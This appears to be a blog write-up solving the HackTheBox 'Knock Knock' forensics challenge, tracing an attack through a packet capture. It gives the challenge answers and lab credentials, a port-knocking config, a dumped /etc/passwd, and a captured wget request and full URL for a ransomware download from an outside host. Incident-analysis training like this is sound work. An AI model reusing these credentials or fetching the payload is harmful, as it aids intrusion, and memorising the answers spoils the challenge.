---
title: "HackTheBox - Knock Knock"
author: DrLi
description: "Writeup of a medium-rated DFIR Sherlock challenge from HackTheBox"
date: 2025-11-11 18:50:00 +0100
categories : [HackTheBox, Sherlocks]
tags: [hackthebox, sherlock, dfir, medium, pcap analysis, wireshark, tshark, port scanning, ftp brute force, port knocking, directory traversal, osint, github, ransomware, network forensics]
img_path: /assets/img/HackTheBox/Sherlocks/KnockKnock
image:
    path: /assets/img/HackTheBox/Sherlocks/KnockKnock/knockknock.png
---

<div align="center"> <script src="https://tryhackme.com/badge/2794771"></script> </div>

---

Knock Knock from [HackTheBox](https://www.hackthebox.com/) is a medium DFIR Sherlock challenge that involves analyzing a packet capture from a compromised Forela Dev server. The investigation begins with identifying open ports through TCP SYN-ACK analysis and tracing an FTP brute force attack that provided initial access. The attacker then leveraged directory traversal to escape the FTP chroot jail, discovered port knocking configuration to access a hidden FTP service on a non-standard port, and extracted sensitive database files and credentials. Through OSINT techniques, we discover leaked SSH credentials in a public GitHub repository's commit history. The investigation concludes by identifying ransomware download activity via HTTP traffic analysis, demonstrating a complete attack chain from reconnaissance to final payload deployment.



### Description

<aside>
💡

**A critical Forela Dev server was targeted by a threat group. The Dev server was accidentally left open to the internet which it was not supposed to be. The senior dev Abdullah told the IT team that the server was fully hardened and it's still difficult to comprehend how the attack took place and how the attacker got access in the first place. Forela recently started its business expansion in Pakistan and Abdullah was the one IN charge of all infrastructure deployment and management. The Security Team need to contain and remediate the threat as soon as possible as any more damage can be devastating for the company, especially at the crucial stage of expanding in other region. Thankfully a packet capture tool was running in the subnet which was set up a few months ago. A packet capture is provided to you around the time of the incident (1-2) days margin because we don't know exactly when the attacker gained access. As our forensics analyst, you have been provided the packet capture to assess how the attacker gained access. Warning : This Sherlock will require an element of OSINT to complete fully.**

</aside>

### Questions

**Which ports did the attacker find open during their enumeration phase?**

<aside>
💡

21,22,3306,6379,8086

</aside>

```bash
to answer this we need first to understand the situation and since the Pcap has data for over 2 days it's a lot to go through 
so we need to filter for only the usefull packets
first we need to identify the attackers IP and server IP
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image.png)

```bash
134000 packets between these two IPs which makes me think there is something going on there
if we filter for those two IPs we can see this 
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image1.png)

```bash
this means the attacker ip is 3.109.209.43 and the victim IP is 172.31.39.46
and we can see that the attacker did a TCP port scanning 
we can identify the open ports found using this tshark command
```

```bash
┌──(drli㉿kali)-[/media/sf_kalisharedfolder]
└─$ tshark -r capture.pcap -Y "ip.src==172.31.39.46 && ip.dst==3.109.209.43 && tcp.flags.syn==1 && tcp.flags.ack==1" -T fields -e tcp.srcport

21
22
3306
6379
8086
```

**Whats the UTC time when attacker started their attack against the server?**

<aside>
💡

21/03/2023 10:42:23

</aside>

```bash
we can find this by going to the first request the attacker sent to the victim server
```

**What's the MITRE Technique ID of the technique attacker used to get initial access?**

<aside>
💡

T1110.003

</aside>

```bash
the attacker was brute forcing for valid FTP credentials until he got them so searching for "bruteforce mitre" gets you the answer
```

**What are valid set of credentials used to get initial foothold?**

<aside>
💡

tony.shephard:Summer2023!

</aside>

```bash
after too many unsuccessful attempts the attcker got the right credentials
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image2.png)

**What is the Malicious IP address utilized by the attacker for initial access?**

<aside>
💡

3.109.209.43

</aside>

```bash
as we identified earlier this is the attackers IP
```

**What is name of the file which contained some config data and credentials?**

<aside>
💡

.backup

</aside>

```bash
after successfuly authentication the attacker retrieved two files 
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image3.png)

```bash
after checking the backup file we can find some credentials
```

```bash
$ cat .backup                  
[options]
        UseSyslog

[FTP-INTERNAL]
        sequence    = 29999,50234,45087
        seq_timeout = 5
        command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT
        tcpflags    = syn

# Creds for the other backup server abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad
```

**Which port was the critical service running?**

<aside>
💡

24456

</aside>

```bash
this is found in the backup file:  command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 24456 -j ACCEPT
```

**Whats the name of technique used to get to that critical service?**

<aside>
💡

**port knocking**

</aside>

```bash
based on the .backup file configuration, the attacker needed to send connection attempts in a specific sequence to ports 29999, 50234, and 45087 within a 5-second timeout window. Once this "knock sequence" was completed, the iptables firewall rule automatically opened port 24456 to accept TCP connections
```

**Which ports were required to interact with to reach the critical service?**

<aside>
💡

29999,45087,50234

</aside>

**Whats the UTC time when interaction with previous question ports ended?**

<aside>
💡

21/03/2023 10:58:50

</aside>

```bash
to get this we need to follow the packets after the attacker ended the FTP connection 
he interacted with the specified ports
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image4.png)

**What are set of valid credentials for the critical service?**

<aside>
💡

abdullah.yasin:XhlhGame_90HJLDASxfd&hoooad

</aside>

```bash
this is found in the backup file
```

**At what UTC Time attacker got access to the critical server?**

<aside>
💡

21/03/2023 11:00:01

</aside>

```bash
to get this we need to follow and see when did the attacker successfuly connect to the critical FTP server 
```

**Whats the AWS AccountID and Password for the developer "Abdullah"?**

<aside>
💡

391629733297:yiobkod0986Y[adij@IKBDS

</aside>

```bash
to get this we first need to see what did the attacker do 
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image5.png)

```bash
so he got a bunch of files and one of them was this database file 
so we need to retrieve it but since the port is not a native FTP port we can just export it
so need to setup wireshark to decode all the packets from port 24456 as FTP
```

```bash
Wireshark "Decode As" (GUI)
Open the PCAP in Wireshark

Filter for traffic on port 24456: tcp.port == 24456

Right-click on any packet from that port

Select Decode As...

In the dialog, set:

Field: TCP port

Value: 24456

Current: FTP

Click OK
```

```bash
now we can export all the files the attacker downloaded
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image6.png)

```bash
inside the database we can find this
```

```sql
DROP TABLE IF EXISTS `AWS_EC2_DEV`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `AWS_EC2_DEV` (
  `NAME` varchar(40) DEFAULT NULL,
  `AccountID` varchar(40) DEFAULT NULL,
  `Password` varchar(60) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `AWS_EC2_DEV`
--

LOCK TABLES `AWS_EC2_DEV` WRITE;
/*!40000 ALTER TABLE `AWS_EC2_DEV` DISABLE KEYS */;
INSERT INTO `AWS_EC2_DEV` VALUES ('Alonzo','341624703104',''),(NULL,NULL,'d;089gjbj]jhTVLXEROP.madsfg'),('Abdullah','391629733297','yiobkod0986Y[adij@IKBDS');
```

**Whats the deadline for hiring developers for forela?**

<aside>
💡

30/08/2023

</aside>

```sql
we have a file called "Tasks to get Done" which will mostly have what we are looking for
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image7.png)

**When did CEO of forela was scheduled to arrive in pakistan?**

<aside>
💡

08/03/2023

</aside>

```sql
in the file reminder we have the answer:
└─$ cat reminder.txt        
I am so stupid and dump, i keep forgetting about Forela CEO Happy grunwald visiting Pakistan to start the buisness operations 
here.I have so many tasks to complete so there are no problems once the Forela Office opens here in Lahore. I am writing this 
note and placing it on all my remote servers where i login almost daily, just so i dont make a fool of myself and get the 
urgent tasks done.

He is to arrive in my city on 8 march 2023 :))

i am finally so happy that we are getting a physical office opening here.
```

**The attacker was able to perform directory traversel and escape the chroot jail.This caused attacker to roam around the filesystem just like a normal user would. Whats the username of an account other than root having /bin/bash set as default shell?**

<aside>
💡

cyberjunkie

</aside>

```sql
we know the attacker downloaded /etc/passwd:
└─$ cat %2fetc%2fpasswd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
landscape:x:111:116::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ec2-instance-connect:x:113:65534::/nonexistent:/usr/sbin/nologin
_chrony:x:114:121:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
abdullah.yasin:x:1001:1001::/home/abdullah.yasin:/bin/sh
tony.shephard:x:1002:1002::/home/tony.shephard:/bin/sh
ftp:x:115:123:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
redis:x:116:124::/var/lib/redis:/usr/sbin/nologin
mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:118:126::/var/spool/postfix:/usr/sbin/nologin
influxdb:x:119:65534::/var/lib/influxdb:/usr/sbin/nologin
cyberjunkie:x:1003:1003:,,,:/home/cyberjunkie:/bin/bash
```

**Whats the full path of the file which lead to ssh access of the server by attacker?**

<aside>
💡

/opt/reminders/.reminder

</aside>

```sql
CWD opt

250 Directory successfully changed.

EPSV

229 Entering Extended Passive Mode (|||26282|)

LIST -la

150 Here comes the directory listing.
226 Directory send OK.

EPSV

229 Entering Extended Passive Mode (|||45303|)

NLST

150 Here comes the directory listing.
226 Directory send OK.

CWD reminders

250 Directory successfully changed.

EPSV

229 Entering Extended Passive Mode (|||8945|)

LIST -la

150 Here comes the directory listing.
226 Directory send OK.

EPSV

229 Entering Extended Passive Mode (|||43118|)

NLST

150 Here comes the directory listing.
226 Directory send OK.

TYPE I

200 Switching to Binary mode.

SIZE .reminder

213 94

EPSV

229 Entering Extended Passive Mode (|||44249|)

RETR .reminder

150 Opening BINARY mode data connection for .reminder (94 bytes).
226 Transfer complete.
```

```sql
inside the file we have 
└─$ cat .reminder      
A reminder to clean up the github repo. Some sensitive data could have been leaked from there
```

**Whats the SSH password which attacker used to access the server and get full access?**

<aside>
💡

YHUIhnollouhdnoamjndlyvbl398782bapd

</aside>

```sql
to get this we need to use some OSINT since the reminder says something about github and leaking sensitive data we should find the repository
```

```sql
using this google search "forela github repo" we were able to find this
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image8.png)

```sql
the internal-dev file some ssh data but no password if we check the history of the commits we can find this
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image9.png)

**Whats the full url from where attacker downloaded ransomware?**

<aside>
💡

[http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_Server.zip](http://13.233.179.35/PKCampaign/Targets/Forela/Ransomware2_Server.zip)

</aside>

```sql
so the attacker connected to SSH and then he downloaded the ransomware 
so this means that the server made an HTTP request to get the ransomware
```

![image.png](/assets/img/HackTheBox/Sherlocks/KnockKnock/image10.png)

**Whats the tool/util name and version which attacker used to download ransomware?**

<aside>
💡

Wget/1.21.2

</aside>

```sql
GET /PKCampaign/Targets/Forela/Ransomware2_server.zip HTTP/1.1
Host: 13.233.179.35
User-Agent: Wget/1.21.2
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
```

**Whats the ransomware name?**

<aside>
💡

GonnaCry

</aside>

```sql
if we extract the zip we can find the ransomware name
```

DONE!